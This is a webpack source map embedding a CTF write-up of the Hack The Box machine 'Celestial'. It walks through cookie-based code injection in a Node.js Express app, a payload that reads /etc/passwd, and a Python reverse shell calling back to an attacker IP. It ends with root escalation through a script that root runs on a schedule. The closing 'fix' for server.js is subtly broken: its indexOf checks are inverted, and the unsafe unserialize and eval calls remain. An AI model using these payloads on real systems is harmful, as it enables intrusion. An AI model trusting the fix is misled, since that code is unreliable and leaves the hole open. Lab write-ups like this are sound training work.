{"version":3,"file":"js/178.7166f9f1.js","mappings":"spBAAKA,MAAM,qB,GAAXC,EAAAA,EAAAA,IAAAA,iWAAAA,EAAAA,sGAAAA,EAAAA,wCAAAA,EAAAA,oOAAAA,EAAAA,mPAAAA,EAAAA,yNAAAA,EAAAA,o1DAAAA,EAAAA,siBAAAA,EAAAA,i2BAAAA,EAAAA,iMAAAA,EAAAA,oHAAAA,EAAAA,qZAAAA,EAAAA,yKAAAA,EAAAA,oMAAAA,EAAAA,4tFAAAA,I,GAA+BC,G,kCAA/BC,EAAAA,EAAAA,IA+IM,MA/INC,EAAAC,E,eCCA,MAAMC,EAAS,CAAC,EAGVC,GAA2B,OAAgBD,EAAQ,CAAC,CAAC,SAASE,KAEpE,O","sources":["webpack://personal_website/./src/components/notes/ctfwriteup/HTB/Medium/Celestial/Writeup.md","webpack://personal_website/./src/components/notes/ctfwriteup/HTB/Medium/Celestial/Writeup.md?75d3"],"sourcesContent":["<template><div class=\"component-writeup\"><h1>Recon</h1>\n<h2>Nmap</h2>\n<pre v-pre=\"\"><code>nmap -Pn -v -p- -sV --min-rate 1000 celestial.htb -oN celestial_nmap.txt\n</code></pre>\n<pre v-pre=\"\"><code>PORT     STATE SERVICE VERSION\n3000/tcp open  ppp?\n</code></pre>\n<h1>Initial Foothold and User.txt</h1>\n<p>Main page shows the text “404” on first visit. On subsequent visits the following text is shown.\n<img src=\"./Screenshots/image_1.png\" alt=\"Screenshots\"></p>\n<p>Examining the HTTP header shows a base64 encoded cookie value\n<img src=\"./Screenshots/image_2.png\" alt=\"Screenshots\"></p>\n<p><img src=\"./Screenshots/image_3.png\" alt=\"Screenshots\"></p>\n<p>2 of the JSON attributes seems to be reflected on the main page</p>\n<ul>\n<li>username</li>\n<li>num</li>\n</ul>\n<p>The num parameter seems to be concatenated. This is tested by setting num to 3.\n<img src=\"./Screenshots/image_4.png\" alt=\"Screenshots\"></p>\n<p>The server seems to be using templates to reflect these 2 value. By trying the common payload for Server-side Template Injection “{7*7}”, the server evaluated the multiplication provided and printed 49.\n<img src=\"./Screenshots/image_5.png\" alt=\"Screenshots\"></p>\n<p>This proves that SSTI is possible. As an attempt to determine the exact backend framework and template engine used, an error was triggered which returned verbose error message.\n<img src=\"./Screenshots/image_6.png\" alt=\"Screenshots\">\nThe error message</p>\n<pre v-pre=\"\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;SyntaxError: Unexpected token }&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/sun/server.js:13:29&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/home/sun/node_modules/express/lib/router/route.js:137:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/sun/node_modules/express/lib/router/index.js:281:22&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/home/sun/node_modules/express/lib/router/index.js:275:10)&lt;br&gt; &amp;nbsp; &amp;nbsp;at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>From this we can see that:</p>\n<ul>\n<li>The server is running Express Node.js web framework</li>\n<li>There is a user “sun”\nHowever, it still doesn’t show what template engine is used.</li>\n</ul>\n<p>A script was made to try perform fuzzing on the num parameter and see if any special characters will trigger the same syntax error. The following is the result:</p>\n<pre v-pre=\"\"><code>-\n.\n\"\"\n{}\n/\n</code></pre>\n<p>Also some global variables seems to return valid results (e.g. global).\n<img src=\"./Screenshots/image_7.png\" alt=\"Screenshots\"></p>\n<p>Through more googling, the following payload from HackTricks worked, which is intended for the template engine Jade.</p>\n<pre v-pre=\"\"><code>root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout\n</code></pre>\n<p>Source: <a href=\"https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jade-nodejs\">https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jade-nodejs</a></p>\n<p>Output:\n<img src=\"./Screenshots/image_8.png\" alt=\"Screenshots\"></p>\n<p>It was found to be quite difficult to just run a one-line command for reverse shell execution (escaping quotes are painful). So from here the following steps were done to obtain a reverse shell:</p>\n<ol>\n<li>Confirm that python3 is installed on the server (which python3)</li>\n<li>Use <a href=\"http://revshells.com\">revshells.com</a> to create a python reverse shell</li>\n<li>Issue a command to the server to download the reverse shell</li>\n<li>Listen on port 443 (on attacker machine)</li>\n<li>Execute the python reverse shell payload downloaded</li>\n</ol>\n<p>Payload used:</p>\n<pre v-pre=\"\"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.73\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")\n</code></pre>\n<p><img src=\"./Screenshots/image_9.png\" alt=\"Screenshots\"></p>\n<p>user.txt at /home/sun/user.txt</p>\n<h1>Root.txt</h1>\n<p>On the user’s home directory, there was one file that stood out as it seems to be written by root.\n<img src=\"./Screenshots/image_10.png\" alt=\"Screenshots\"></p>\n<p>There is also another python script that seems to print out the exact words\n<img src=\"./Screenshots/image_11.png\" alt=\"Screenshots\"></p>\n<p>To do a simple test to check if the <a href=\"http://script.py\">script.py</a> was indeed running by root as a background process, the <a href=\"http://script.py\">script.py</a> was modified to print out something different</p>\n<pre v-pre=\"\"><code>print \"No it's not running...\"\n</code></pre>\n<p>After 5 minutes, the output.txt file changed to the modified content\n<img src=\"./Screenshots/image_12.png\" alt=\"Screenshots\">\nAfter the first execution, the process is also shown when listing running processes. This shows that the script is indeed ran by root.\n<img src=\"./Screenshots/image_13.png\" alt=\"Screenshots\"></p>\n<p>By using the same python3 reverse shell payload used during initial access (changing connection port to 445), a reverse shell was obtained running as root.\n<img src=\"./Screenshots/image_14.png\" alt=\"Screenshots\"></p>\n<h1>Just for Fun</h1>\n<h2>Try to fix vulnerable server.js script</h2>\n<p>The following is the content of server.js which is the main script of the web server (in /home/sun/server.js).</p>\n<pre v-pre=\"\"><code>var express = require('express');\nvar cookieParser = require('cookie-parser');\nvar escape = require('escape-html');\nvar serialize = require('node-serialize');\nvar app = express();\napp.use(cookieParser())\n \napp.get('/', function(req, res) {\n if (req.cookies.profile) {\n   var str = new Buffer(req.cookies.profile, 'base64').toString();\n   var obj = serialize.unserialize(str);\n   if (obj.username) { \n     var sum = eval(obj.num + obj.num);\n     res.send(\"Hey \" + obj.username + \" \" + obj.num + \" + \" + obj.num + \" is \" + sum);\n   }else{\n     res.send(\"An error occurred...invalid username type\"); \n   }\n}else {\n     res.cookie('profile', \"eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==\", {\n       maxAge: 900000,\n       httpOnly: true\n     });\n }\n res.send(\"&lt;h1&gt;404&lt;/h1&gt;\");\n});\napp.listen(3000);\n</code></pre>\n<p>We can see that the vulnerability lies in  <code>var sum = eval(obj.num + obj.num);</code>, where the user input <code>obj.num</code> is directly evaluated without any sanitization.</p>\n<p>The most straightforward way to fix it is to check for the bracket characters <code>{</code> and <code>}</code> and prevent them from passing to <code>eval()</code></p>\n<pre v-pre=\"\"><code>var express = require('express');\nvar cookieParser = require('cookie-parser');\nvar escape = require('escape-html');\nvar serialize = require('node-serialize');\nvar app = express();\napp.use(cookieParser())\n \napp.get('/', function(req, res) {\n if (req.cookies.profile) {\n   var str = new Buffer(req.cookies.profile, 'base64').toString();\n   var obj = serialize.unserialize(str);\n   if (obj.username &amp;&amp; obj.num.indexOf(\"{\") == 0 &amp;&amp; obj.num.indexOf(\"}\") == 0) { \n     var sum = eval(obj.num + obj.num);\n     res.send(\"Hey \" + obj.username + \" \" + obj.num + \" + \" + obj.num + \" is \" + sum);\n   }else{\n     res.send(\"An error occurred...invalid username type\"); \n   }\n}else {\n     res.cookie('profile', \"eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==\", {\n       maxAge: 900000,\n       httpOnly: true\n     });\n }\n res.send(\"&lt;h1&gt;404&lt;/h1&gt;\");\n});\napp.listen(3000);\n</code></pre>\n</div></template>","import { render } from \"./Writeup.md?vue&type=template&id=22512310\"\nconst script = {}\n\nimport exportComponent from \"../../../../../../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render]])\n\nexport default __exports__"],"names":["class","_createStaticVNode","_hoisted_2","_createElementBlock","_hoisted_1","_hoisted_45","script","__exports__","render"],"sourceRoot":""}